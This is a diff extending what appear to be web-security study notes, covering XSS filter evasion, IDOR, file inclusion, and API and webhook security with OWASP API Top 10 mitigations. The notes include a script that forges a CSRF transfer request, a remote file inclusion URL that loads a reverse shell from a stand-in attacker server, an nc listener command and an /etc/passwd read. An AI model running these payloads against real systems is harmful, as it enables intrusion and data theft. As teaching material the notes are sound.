@@ -212,3 +212,105 @@ An attacker can leverage XSS to inject a CSRF attack, combining the power of bot
   new Image().src = "http://victim.com/transfer?amount=100&account=attacker_account";
 </script>
 ```
+
+## Summary of Input Filtering Evasion Techniques
+1. **Character Encoding:**
+   - Utilize different representations like HTML entities and hexadecimal encoding to alter characters and bypass filters.
+     
+2. **White Space Manipulation:**
+   - Use spaces, tabs, line breaks, and other white space characters to disguise input.
+   - Encode white space characters to avoid issues with spaces in commands.
+
+3. **Script Tag Manipulation:**
+   - Alter the case of characters in script tags to confuse case-sensitive filters.
+   - Mixing case in script tags can bypass filters that are not case-sensitive.
+
+4. **Polyglots:**
+   - Combine various encoding and evasion techniques into one string.
+   - Effective for bypassing filters but require testing to find the right combination.
+   - Polyglots offer a versatile approach to evading input filters, emphasizing experimentation and understanding filter mechanisms.
+   - Check it out: [https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot](Polygots).
+  
+## Insecure Direct Object Reference (IDOR)
+IDOR stands for Insecure Direct Object Reference, indicating a vulnerability where users can manipulate parameters of a web application that should be inaccessible.
+
+- **Characteristics:**
+  - Users can access and modify sensitive data or functionality that should be restricted (like ticket price during ticket purchase POST request).
+  - Often arises due to oversight or neglect in implementing proper access controls.
+  
+- **Exploitation:**
+  - Attackers leverage IDOR vulnerabilities to gain unauthorized access to resources or perform actions beyond their privileges.
+  - Manipulating parameters through tools like Burp Suite or browser dev tools allows users to bypass intended restrictions.
+
+- **Example:**
+  - Consider a scenario where users can order movie tickets with an exploitable IDOR vulnerability.
+  - By modifying parameters like ticket quantity and price, users can obtain tickets at unauthorized prices or quantities.
+  - The backend system fails to enforce proper access controls, leading to exploitation of the vulnerability.
+
+- **Prevention:**
+  - Mitigating IDOR vulnerabilities requires implementing robust access controls, validating user inputs, and enforcing least privilege principles.
+
+## File Inclusion
+
+### What Is File Inclusion?
+File inclusion involves incorporating a file into a web application. This can be done either by fetching files from the local file system or from a remote source. 
+
+### Types of File Inclusion
+1. **Local File Inclusion (LFI)**:
+   - Includes files from the local file system.
+   - Example: Including a configuration file from the server.
+
+2. **Remote File Inclusion (RFI)**:
+   - Includes files from a remote server.
+   - Example: Including an image hosted on another server.
+
+### Why Is File Inclusion Dangerous?
+While file inclusion is a useful feature in web development, it can be exploited by malicious actors to gain unauthorized access to sensitive files or even the server itself.
+
+### Demonstrating Remote File Inclusion
+1. In the URL of the vulnerable web application, replace the local file path with the path to rev_shell.php hosted on the attacker's server: `http://vulnerable-app.com/index.php?page=http://attacker-server/rev_shell.php`. Once executed, the reverse shell connects back to the attacker, providing remote access.
+2. We have already set up a listener to use the reverse shell when established: `nc -nvlp 9999  # Start the listener on port 9999`
+
+### Demonstrating Local File Inclusion
+1. The file `/etc/passwd` is a common target to demonstrate LFI.
+2. Modify the URL parameter to include /etc/passwd: `http://vulnerable-app.com/index.php?page=/etc/passwd`
+
+## APIs and Webhooks
+
+### What is an API?
+API stands for Application Programming Interface. An API allows different software applications to communicate with each other.
+
+#### Key Features of APIs:
+- **Interoperability**: APIs enable different systems and software to work together, regardless of the underlying technologies they are built on.
+- **Efficiency**: They automate processes that would otherwise require manual intervention, making tasks more efficient.
+- **Scalability**: APIs can handle numerous requests simultaneously, supporting scalability in software applications.
+
+#### Types of APIs:
+1. **REST (Representational State Transfer)**: Uses standard HTTP methods (GET, POST, PUT, DELETE) and is often preferred for web services because of its simplicity and performance. It typically uses JSON for data exchange.
+2. **SOAP (Simple Object Access Protocol)**: A protocol for exchanging structured information in web services. It relies on XML and is known for its strict standards and extensibility.
+
+### What is a Webhook?
+A webhook is a method of augmenting or altering the behavior of a web application with custom callbacks. It is a way for an application to provide real-time information to other applications. Webhooks are triggered by events and send data to a specified URL in real-time.
+
+#### How Webhooks Work:
+- **Event-Driven**: Webhooks are configured to listen for specific events. When an event occurs, the webhook sends a payload of data to a pre-defined URL.
+- **Push Notifications**: They work like push notifications, notifying the recipient immediately when an event occurs, rather than requiring the recipient to poll the server for updates.
+
+### OWASP API Security Top 10:
+1. Broken Object Level Authorization
+2. Broken User Authentication
+3. Excessive Data Exposure
+4. Lack of Resources and Rate Limiting
+5. Broken Function Level Authorization
+6. Mass Assignment
+7. Security Misconfiguration
+8. Injection
+9. Improper Asset Management
+10. Insufficient Logging and Monitoring
+
+### Mitigation Strategies:
+- **Input Sanitization**: Ensuring that user inputs are sanitized to prevent injection attacks.
+- **Firewalls and Rate Limiting**: Implementing firewalls and rate limiting to protect against excessive requests and brute force attacks.
+- **Parameterized Queries**: Using parameterized statements to prevent SQL injection.
+- **Authentication and Authorization**: Ensuring robust authentication and authorization mechanisms to prevent unauthorized access.
+- **Webhook Security**: Requiring authentication for webhooks, blacklisting unauthorized sources, and using timestamps to prevent replay attacks.
